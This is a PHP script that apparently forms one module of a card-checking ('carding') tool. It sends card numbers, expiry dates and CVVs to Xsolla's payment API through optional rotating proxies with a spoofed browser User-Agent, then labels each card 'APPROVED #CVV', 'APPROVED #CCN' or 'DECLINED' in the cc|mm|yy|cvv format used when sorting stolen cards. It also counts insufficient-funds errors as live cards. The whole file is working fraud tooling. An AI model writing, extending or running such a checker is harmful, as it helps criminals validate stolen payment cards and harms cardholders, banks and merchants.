<?php
/**
 * Xsolla Payment Gateway Checker
 * This gateway uses the Xsolla API to validate cards
 */

// Function to check card with Xsolla
function checkCardWithXsolla($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig = null) {
    // Project ID should be in apiKey, API Key can be in secretKey
    $projectId = $apiKey;
    $xsollaToken = $secretKey;
    
    // Check if we have the required keys
    if (empty($projectId)) {
        return "❌ XSOLLA ERROR - Missing Project ID";
    }
    
    try {
        // Initialize cURL session
        $ch = curl_init();
        
        // Format month and year
        $formattedMonth = str_pad($mes, 2, '0', STR_PAD_LEFT);
        $formattedYear = strlen($ano) === 2 ? "20" . $ano : $ano;
        
        // Prepare token creation data (first step - tokenize the card)
        $cardData = json_encode([
            "payment" => [
                "currency" => "USD",
                "amount" => 1
            ],
            "settings" => [
                "project_id" => intval($projectId),
                "currency" => "USD",
                "mode" => "sandbox"
            ]
        ]);
        
        // Set cURL options for token creation
        $tokenUrl = "https://secure.xsolla.com/api/v2/project/{$projectId}/payment/token";
        
        curl_setopt($ch, CURLOPT_URL, $tokenUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $cardData);
        
        $headers = [
            "Content-Type: application/json",
            "Accept: application/json",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ];
        
        // Add authorization if we have a token
        if (!empty($xsollaToken)) {
            $headers[] = "Authorization: Basic " . base64_encode("{$xsollaToken}:");
        }
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        // Set proxy if configured
        if ($proxyConfig) {
            curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
            
            if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
            }
            
            if ($proxyConfig['type'] === 'socks5') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        
        // Execute the request
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Check if the request failed
        if (curl_errno($ch)) {
            curl_close($ch);
            return "❌ XSOLLA ERROR - Connection Error: " . curl_error($ch);
        }
        
        curl_close($ch);
        
        // Parse the response
        $result = json_decode($response, true);
        
        // Format BIN information
        $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
        
        // Check if token was created successfully
        if ($httpcode === 200 && isset($result['token'])) {
            $token = $result['token'];
            
            // Now we need to try to validate the card with the token
            $ch = curl_init();
            
            // Prepare card validation data
            $validationData = json_encode([
                "card" => [
                    "number" => $cc,
                    "holder" => $user_data['name'],
                    "expiry_month" => intval($formattedMonth),
                    "expiry_year" => intval(substr($formattedYear, -2)),
                    "security_code" => $cvv
                ]
            ]);
            
            // Set cURL options for validation
            $validationUrl = "https://secure.xsolla.com/api/v2/project/{$projectId}/paystation/card/validate";
            
            curl_setopt($ch, CURLOPT_URL, $validationUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $validationData);
            
            $headers = [
                "Content-Type: application/json",
                "Accept: application/json",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            ];
            
            // Add token header
            $headers[] = "Authorization: Bearer {$token}";
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            // Set proxy if configured
            if ($proxyConfig) {
                curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
                
                if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
                }
                
                if ($proxyConfig['type'] === 'socks5') {
                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                }
            }
            
            // Execute the validation request
            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            // Check if the request failed
            if (curl_errno($ch)) {
                curl_close($ch);
                return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: Token Valid but Validation Failed - {$token} ]{$bin_info}";
            }
            
            curl_close($ch);
            
            // Parse the validation response
            $validationResult = json_decode($response, true);
            
            if ($httpcode === 200 && (isset($validationResult['is_valid']) && $validationResult['is_valid'] === true)) {
                // Card is valid
                return "✅ APPROVED #CVV - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: Card Validated Successfully ]{$bin_info}";
            } elseif ($httpcode === 200 && isset($validationResult['redirect_url'])) {
                // Card requires additional verification (3D Secure, etc.)
                return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: Additional Verification Required ]{$bin_info}";
            } else {
                // Validation failed
                $errorMessage = "Invalid Card";
                
                if (isset($validationResult['error'])) {
                    $errorMessage = $validationResult['error']['message'] ?? $validationResult['error']['code'] ?? "Unknown Error";
                }
                
                // Check for specific error messages that indicate the card is valid but has insufficient funds
                if (strpos($errorMessage, 'fund') !== false || strpos($errorMessage, 'insufficient') !== false) {
                    return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: {$errorMessage} ]{$bin_info}";
                } else {
                    return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: {$errorMessage} ]{$bin_info}";
                }
            }
        } else {
            // Token creation failed
            $errorMessage = "Invalid Project ID";
            
            if (isset($result['error'])) {
                $errorMessage = $result['error']['message'] ?? $result['error']['code'] ?? "Unknown Error";
            }
            
            return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ XSOLLA: {$errorMessage} ]{$bin_info}";
        }
    } catch (Exception $e) {
        return "❌ XSOLLA ERROR - Exception: " . $e->getMessage();
    }
}
?>